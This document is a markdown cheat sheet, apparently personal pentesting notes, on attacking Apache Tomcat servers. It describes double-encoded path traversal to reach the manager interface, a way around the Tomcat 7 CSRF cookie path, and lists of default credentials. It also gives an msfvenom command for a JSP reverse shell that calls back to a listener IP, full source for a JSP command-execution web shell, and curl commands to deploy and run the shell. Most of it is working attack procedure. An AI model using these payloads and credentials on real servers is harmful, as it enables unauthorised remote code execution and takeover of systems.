## Generality

- Pay attention to the error message (404), as you can have the answer from apache server or tomcat. Apache decode the url once and tomcat another time. If you want to try a directory traversal for tomcat, you'll have to encode it twice.

- Admin endpoint : `/manager/html`. So with the first advice, try `http://example.com/jsp/%252e%252e/manager/html`

- In tomcat 7, the developers improved the CSRF protection in the manager. The protection is using the session (JSESSIONID). If no JSESSIONID is sent (or an invalid one), the webshell will not get uploaded and a 403 HTTP response is returned. Usually, this will be done automatically by the browser. However, Tomcat creates the JSESSIONID and send it to the browser with the following path:

`Set-Cookie: JSESSIONID=E5CE6AF4F6DDDF89569743B9F5490129; Path=/manager/;`

Since it's not the right path (because the path seen by the browser is /examples/jsp/%252e....), the browser will not send it in the future request.  Replace /manager/ by /.
  
To manage to upload the shell, a valid JSESSIONID from the initial response (when loading the manager page) needs to be add to the upload request (using a proxy). Alternatively, the Path in the \`Set-Cookie\` of HTTP response can be removed.  
  
Tomcat 7 also features an anti-bruteforce mechanism. So if it doesn't work directly wait for 10 minutes and avoid bruteforcing using automated tools

## Username and password

- Written in ```tomcat-users.xml```. This works for me : ```/usr/share/tomcat9/etc/tomcat-users.xml```, but if not, try to install it with the version needed, and then see where it's stored.
- Could also be in `/etc/tomcat6/tomcat-users.xml`
- Default username and pass : tomcat:tomcat / admin: / admin:manager / admin:password / admin:secret


## Upload reverse shell

- The best part of tomcat server is that the host-manager gives you facility to create, delete, and manage virtual hosts within Tomcat remotely via curl command through command line if you have creds.

- Create Reverse Shell : ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.197 LPORT=1234 -f war > shell.war```

or create an index.jsp :
```
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.\*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

$ mkdir webshell
$ cp index.jsp webshell

Now we can build the war file using `jar` (provide with java):

$ cd webshell
$ jar -cvf ../webshell.war \*
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)


- Upload Reverse Shell : ```curl -u 'user':'pass' -T shell.war 'http://ip:port/manager/text/deploy?path=/my-shell'```

- List Deployed Shell : ```curl -u 'user':'pass' http://ip:port/manager/text/list```

- Start Netcat Listener

- Execute the deployed shell : ```curl -u 'user':'pass' http://ip:port/my-shell/```